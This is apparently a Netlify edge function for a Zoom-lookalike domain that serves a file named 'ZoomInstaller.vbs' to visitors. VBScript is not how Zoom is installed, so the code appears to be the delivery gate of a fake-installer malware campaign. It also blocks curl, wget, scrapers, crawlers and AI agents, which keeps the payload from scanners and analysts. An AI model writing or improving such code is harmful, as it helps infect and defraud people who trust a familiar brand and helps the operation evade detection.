// language: TypeScript, file: netlify/edge-functions/guard.ts
import type { Context } from "@netlify/edge-functions";
import { getStore } from "@netlify/blobs";

const ALLOWED_HOSTS = ["us05web.online", "www.us05web.online"]; // ← YOUR DOMAIN

export default async (request: Request, context: Context) => {
  const url = new URL(request.url);
  const host = (request.headers.get("host") || "").replace(/:\d+$/, "").toLowerCase();
  const referer = request.headers.get("referer") || "";
  const ua = request.headers.get("user-agent") || "";

  // 1. Hostname allow-list — kills clones on other domains
  if (!ALLOWED_HOSTS.includes(host)) {
    return new Response("Not found", { status: 404 });
  }

  // 2. Referer allow-list — blocks hotlinks and off-site embeds
  if (referer && !ALLOWED_HOSTS.some(h => referer.includes(h))) {
    return new Response("Forbidden - Unauthorized Domain", { status: 403 });
  }

  // 3. Block mirror tools and scraper User-Agents
  if (/(httrack|wget|curl|python|scrapy|siteSnagger|webCopier|teleport|flashget|mirror)/i.test(ua)) {
    return new Response("Forbidden", { status: 403 });
  }

  // 4. Block AI agents / crawlers via Netlify header
  const agentCategory = request.headers.get("netlify-agent-category") || "";
  if (agentCategory.startsWith("ai-agent") || agentCategory.startsWith("crawler")) {
    return new Response("Forbidden", { status: 403 });
  }

  // 5. CSS Canary Tripwire — breaks the layout on stolen copies
  if (url.pathname === "/api/canary") {
    return new Response("Blocked", { status: 403 });
  }

  // 6. Download Gate — streams the .vbs from Netlify Blobs
  if (url.pathname.startsWith("/Zoom_Installer_Download/")) {
    
    // TEMPORARILY DISABLED so we can test the download without a token
    // if (!url.searchParams.get("t")) {
    //   return new Response("Forbidden - Missing Token", { status: 403 });
    // }

    // Fetch the .vbs file from the Blobs store we created
    const store = getStore("installers");
    const file = await store.get("ZoomInstaller.vbs", { type: "stream" });
    
    if (!file) return new Response("File not found in Blobs", { status: 404 });

    return new Response(file, {
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": 'attachment; filename="ZoomInstaller.vbs"',
      }
    });
  }

  return context.next();
};

export const config = { path: "/*" };